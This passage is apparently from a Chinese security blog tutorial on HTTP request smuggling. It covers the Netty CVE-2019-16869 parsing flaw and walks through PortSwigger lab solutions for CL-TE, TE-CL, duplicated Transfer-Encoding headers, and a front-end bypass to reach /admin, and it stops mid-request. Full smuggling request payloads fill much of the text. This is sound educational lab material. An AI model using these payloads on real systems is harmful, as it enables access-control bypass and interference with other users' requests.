optional trailing whitespace.</p><p>header-field = field-name &ldquo;:&rdquo; OWS field-value OWS</p><pre><code> field-name     = token
 field-value    = *( field-content / obs-fold )
 field-content  = field-vchar [ 1*( SP / HTAB ) field-vchar ]
 field-vchar    = VCHAR / obs-text

 obs-fold       = CRLF 1*( SP / HTAB )
                ; obsolete line folding
                ; see Section 3.2.4
</code></pre><p>The field-name token labels the corresponding field-value as having
the semantics defined by that header field. For example, the Date
header field is defined in Section 7.1.1.2 of [RFC7231] as containing
the origination timestamp for the message in which it appears.</p></blockquote><p>尤其是开头的一句话表明，字段后面应该紧跟<code>:</code>冒号，然后是 OWS(Optional WhiteSpace) 可选的空格，然后再是字段值，最后是 OWS 可选空格。</p><p>这个会存在什么问题呢？很明显，如果有中间件对于这个的实现并没有严格遵循 RFC 标准的话，也会产生 HTTP Smuggling 攻击。</p><p>比较典型的例子就是 CVE-2019-16869 ，这枚 CVE 是 OPPO 子午互联网安全实验室发掘的，是关于 Netty 中间件存在 HTTP Smuggling 漏洞。</p><p>在 Netty 4.1.42.Final 版本之前对于 Header 头的处理是使用 <a class=link href=https://github.com/netty/netty/blob/netty-4.1.41.Final/codec-http/src/main/java/io/netty/handler/codec/http/HttpObjectDecoder.java target=_blank rel=noopener>splitHeader</a> 方法，其中关键代码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=n>nameEnd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>nameStart</span><span class=p>;</span><span class=w> </span><span class=n>nameEnd</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>length</span><span class=p>;</span><span class=w> </span><span class=n>nameEnd</span><span class=w> </span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=n>ch</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>sb</span><span class=p>.</span><span class=na>charAt</span><span class=p>(</span><span class=n>nameEnd</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>ch</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=sc>&#39;:&#39;</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>Character</span><span class=p>.</span><span class=na>isWhitespace</span><span class=p>(</span><span class=n>ch</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>break</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>其他的代码我们并不需要过多了解，这里我们可以知道这里将空格与<code>:</code>冒号同样处理了，也就是如果存在空格会把<code>:</code>其之前的 field name 正常处理，并不会抛出错误或者进行其他操作。这样就与 RFC 标准的规范不一致了，于是就会产生解析差异。</p><p>@Bi3g0 构建了比较清晰的漏洞原理图：</p><p><img src=https://user-images.githubusercontent.com/18691823/65211134-3e03cd00-dad0-11e9-94a5-b9f04ea18f38.png loading=lazy></p><p>这里用的例子是采用 ELB 作为 Front 服务器，Netty 作为 Backend 服务器进行举例，我们发送如下请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/getusers</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>www.backend.com</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>64</span>
</span></span><span class=line><span class=cl><span class=n>Transfer-Encoding</span> <span class=o>:</span> <span class=l>chunked</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=g>0
</span></span></span><span class=line><span class=cl><span class=g>
</span></span></span><span class=line><span class=cl><span class=g>GET /hacker HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=g>Host: www.hacker.com
</span></span></span><span class=line><span class=cl><span class=g>hacker: hacker
</span></span></span></code></pre></td></tr></table></div></div><p>ELB 会将 Transfer-Encoding 字段忽略，因为它与冒号中间有一个空格，不符合 RFC 标准，会使用 Content-Length 作为解析标准，于是会认为以上请求是一个完整的请求，继而扔给 Backend 服务器，也就是 Netty ，Netty 在这里会优先解析 Transfer-Encoding ，即使这个字段不符合 RFC 标准，但是因为它的实现方式不严格，所以这里因为优先解析 Transfer-Encoding 的原因，它会将这个请求拆分为两个请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/getusers</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>www.backend.com</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>64</span>
</span></span><span class=line><span class=cl><span class=n>Transfer-Encoding</span> <span class=o>:</span> <span class=l>chunked</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=g>0
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/hacker</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>www.hacker.com</span>
</span></span><span class=line><span class=cl><span class=n>hacker</span><span class=o>:</span> <span class=l>hacker</span>
</span></span></code></pre></td></tr></table></div></div><p>这样就造成了 HTTP Smuggling 攻击。</p><p>Netty 于 4.1.42 Final 版本修复了这个漏洞：<a class=link href=https://github.com/netty/netty/pull/9585 target=_blank rel=noopener>Correctly handle whitespaces in HTTP header names as defined by RFC72…</a></p><p>当我们发送 field name 与 : 之间有空格的 header 请求时， netty 会“正确”地返回 400 。</p><h3 id=cl-te>CL-TE</h3><p>接下来几个攻击方式我们可以通过 @portswigger 提供的几个 Lab 给我们进行练习以加深理解——<a class=link href=https://portswigger.net/web-security/request-smuggling target=_blank rel=noopener>HTTP request smuggling</a></p><p>在做之前记得要把 BurpSuite 的自动更新 Content-Length 功能取消了。</p><p><img src=https://blogpic.zdy.one/img/20191013185654.jpg loading=lazy></p><p>首先我们来看 CL-TE 的情况：<a class=link href=https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te target=_blank rel=noopener>Lab: HTTP request smuggling, basic CL.TE vulnerability</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn&rsquo;t support chunked encoding. The front-end server rejects requests that aren&rsquo;t using the GET or POST method.</p><p>To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.</p></blockquote><p>根据题目提示，我们只需要让 Backend 服务器收到 GPOST 方法即可，而且场景也明确告诉我们是一种 CL-TE 的场景。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.net</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>6</span>
</span></span><span class=line><span class=cl><span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>G
</span></span></code></pre></td></tr></table></div></div><p>根据题目的提示要求，这里我们发送两次以上 HTTP 请求包：</p><p><img src=https://blogpic.zdy.one/img/20191013190441.jpg loading=lazy></p><p><img src=https://blogpic.zdy.one/img/20191013190452.jpg loading=lazy></p><p>我们就可以使第二次请求构造出 GPOST 的 HTTP Method 了，详细的我们可以按照下面这个流程图来看看：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>                      User            Front           Backend
</span></span><span class=line><span class=cl>                      |               |               |
</span></span><span class=line><span class=cl>                      |--A(1A+1/2B)--&gt;|               | 
</span></span><span class=line><span class=cl>                      |               |--A(1A+1/2B)--&gt;| 
</span></span><span class=line><span class=cl>                      |               |&lt;-A(200)-------|
</span></span><span class=line><span class=cl>                      |               |            [1/2B]
</span></span><span class=line><span class=cl>                      |&lt;-A(200)-------|            [1/2B]
</span></span><span class=line><span class=cl>                      |--C-----------&gt;|            [1/2B]
</span></span><span class=line><span class=cl>                      |               |--C-----------&gt;| * ending B *
</span></span><span class=line><span class=cl>                      |               |&lt;--B(200)------|
</span></span><span class=line><span class=cl>                      |&lt;--B(200)------|               |
</span></span></code></pre></td></tr></table></div></div><ul><li>1A + 1/2B 表示的是一个完整的请求 A + 一个不完整的请求 B</li><li>A(X) : 表示 X 请求隐藏在 A 请求的 body 当中</li><li>ending B: 请求 C 第一行被拼接到了不完整的请求 B 的 header 头当中，请求 C 其他所有的请求头都被添加到了请求 B 当中，这样请求 C 就相当于消失了，请求 B 会带着请求 C 的请求头去请求后段服务器，包括 Cookie 字段或者其他什么认证字段</li></ul><p>整个过程就是，我们发送以上请求，当 Front 服务器优先以 CL 处理时，会认为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>0\r\n
</span></span></span><span class=line><span class=cl><span class=err>\r\n
</span></span></span><span class=line><span class=cl><span class=err>G
</span></span></span></code></pre></td></tr></table></div></div><p>以上 6 个字节为请求 A 的 body ，会将这个请求 A 当作一个完整的请求转发到后端，而当 Backend 服务器优先以 TE 处理时，会认为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.net</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>6</span>
</span></span><span class=line><span class=cl><span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>0
</span></span></code></pre></td></tr></table></div></div><p>这个是一个完整的，单独的请求，而</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>G
</span></span></span></code></pre></td></tr></table></div></div><p>这个他会视为一个不完整的请求，所以就造成了 1/2 B 请求的产生，于是会在 Backend 服务器缓冲区处等待其他数据的到来以使得将 1/2 B 拼接成一个完整的请求，当我们发送第二遍请求的时候，POST 会拼接到 G 后面，所以 HTTP Method 会变成 GPOST 方法，也就是我们看到的得到的回显，无法识别的 HTTP Method GPOST。</p><h3 id=te-cl>TE-CL</h3><p>接下来我们来看 TE-CL 的情况，同样我们借助 LAB 实验来加深理解：<a class=link href=https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl target=_blank rel=noopener>Lab: HTTP request smuggling, basic TE.CL vulnerability</a></p><blockquote><p>This lab involves a front-end and back-end server, and the back-end server doesn&rsquo;t support chunked encoding. The front-end server rejects requests that aren&rsquo;t using the GET or POST method.</p><p>To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.</p></blockquote><p>按照题目提示，我们要达到的仍然是让后端收到 GPOST 请求，而且场景也明确告诉我们是一种 TE-CL 的场景。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>acde1ffc1f047f9f8007186200ff00fe.web-security-academy.net</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-length</span><span class=o>:</span> <span class=l>4</span>
</span></span><span class=line><span class=cl><span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>12
</span></span><span class=line><span class=cl>GPOST / HTTP/1.1
</span></span><span class=line><span class=cl>0
</span></span></code></pre></td></tr></table></div></div><p>这里需要注意的是最后需要加两个 CRLF 构造 chunk data，也就是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0\r\n
</span></span><span class=line><span class=cl>\r\n
</span></span></code></pre></td></tr></table></div></div><p>根据题目的提示要求，这里我们发送两次以上 HTTP 请求包即可，我们可以收到如下图所示的响应。</p><p><img src=https://blogpic.zdy.one/img/20191122230209.png loading=lazy></p><p>过程流程与 CL-TE 类似，Front 服务器处理这个请求的时候按照 TE 优先处理，会认为上面的请求为一个请求整体，然后转发给 Backend 服务器，Backend 服务器在处理的时候按照 CL 优先处理，会认为<code>12\r\n</code>为第一个请求的 body ，以下为第二个请求，所以会响应 GPOST 为无法识别的 HTTP Method。</p><h3 id=two-identical-fields---te>Two Identical Fields - TE</h3><p>这里我们来看 TE 都存在的情况，同样我们借助 LAB 实验来加深理解：<a class=link href=https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header target=_blank rel=noopener>Lab: HTTP request smuggling, obfuscating the TE header</a></p><blockquote><p>This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren&rsquo;t using the GET or POST method.</p><p>To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.</p></blockquote><p>按照题目提示，我们要达到的仍然是让后端收到 GPOST 请求，而且场景也明确告诉我们是一种 TE-TE 的场景。其实这个场景也可以认为是相同字段的场景处理，比如说在处理两个 TE 字段，如果取第二个 TE 字段作为解析标准，而第二个字段值非正常或者解析出错，就可能会忽略掉 TE 字段，而使用 CL 字段进行解析。比如在这个 LAB 中，我们发送两遍如下请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>acfd1f201f5fb528809b582e004200a3.web-security-academy.net</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQ</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
</span></span><span class=line><span class=cl><span class=n>Content-length</span><span class=o>:</span> <span class=l>4</span>
</span></span><span class=line><span class=cl><span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>
</span></span><span class=line><span class=cl><span class=n>Transfer-encoding</span><span class=o>:</span> <span class=l>nothing</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=g>12
</span></span></span><span class=line><span class=cl><span class=g>GPOST / HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=g>
</span></span></span><span class=line><span class=cl><span class=g>0
</span></span></span></code></pre></td></tr></table></div></div><p>这里同上一个场景一样，需要在最后添加两个 CRLF ：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0\r\n
</span></span><span class=line><span class=cl>\r\n
</span></span></code></pre></td></tr></table></div></div><p>我们就可以得到如下图的响应：</p><p><img src=https://blogpic.zdy.one/img/20191123002425.png loading=lazy></p><p>我们可以看到这里是用了两个 TE 字段，并且第二个 TE 字段值非标准值，这里 Front 选择对第一个 TE 进行优先处理，整个请求则为正常请求，会转发给 Backend 服务器，而 Backend 服务器以第二个 TE 进行优先处理，而第二个 TE 值非正常，则会取 CL 字段进行处理，这样这个请求就会因为 CL 字段设置的值 4 而被拆分为两个请求。</p><p>第一个请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>acfd1f201f5fb528809b582e004200a3.web-security-academy.net</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQ</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
</span></span><span class=line><span class=cl><span class=n>Content-length</span><span class=o>:</span> <span class=l>4</span>
</span></span><span class=line><span class=cl><span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>
</span></span><span class=line><span class=cl><span class=n>Transfer-encoding</span><span class=o>:</span> <span class=l>nothing</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=g>12
</span></span></span></code></pre></td></tr></table></div></div><p>第二个请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>G</span><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=g>0
</span></span></span></code></pre></td></tr></table></div></div><p>这样就发送了一个无法识别的 HTTP Method GPOST 请求。</p><h2 id=attack-surface>Attack Surface</h2><p>上面我们大概介绍了几种攻击方式，下面我来看看这些攻击方式可以用来干嘛。同样我们将配合实验环境帮助理解与复现。</p><h3 id=bypass-front-end-security-controls>Bypass Front-end Security Controls</h3><p>这里提供了两个实验环境，一个是 CL-TE 形式的 <a class=link href=https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te target=_blank rel=noopener>Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability</a> ，一个是TE-CL 形式的 <a class=link href=https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl target=_blank rel=noopener>Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability</a>，两个实验最终达到的目的一样，这里我们随便选用 CL-TE 的来进行实验。</p><blockquote><p>​ This lab involves a front-end and back-end server, and the front-end server doesn&rsquo;t support chunked encoding. There&rsquo;s an admin panel at /admin, but the front-end server blocks access to it.</p><p>To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.</p></blockquote><p>架构一样，只不过这次我们需要去利用 HTTP Smuggling 获取 admin 权限并删除 carlos 用户。</p><p>我们生成 LAB 之后，直接访问<code>/admin</code>会发现 <code>"Path /admin is blocked"</code>，看来不能通过正常方式访问<code>/admin</code>，那我们尝试 HTTP Smuggling 的方式，发送如下数据包两次：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>28</span>
</span></span><span class=line><span class=cl><span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=g>0
</span></span></span><span class=line><span class=cl><span class=g>
</span></span></span><span class=line><span class=cl><span class=g>GET /admin HTTP/1.1
</span></span></span></code></pre></td></tr></table></div></div><p>得到的响应如下两图</p><p><img src=https://blogpic.zdy.one/img/20191123154656.png loading=lazy></p><p><img src=https://blogpic.zdy.one/img/20191123154609.png loading=lazy></p><p>可以看到第二个请求我们得到了<code>/admin</code>的响应</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;container is-page&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  Admin interface only available if logged in as an administrator, or if requested as localhost
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>于是我们添加 HOST 头再次发送几次</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
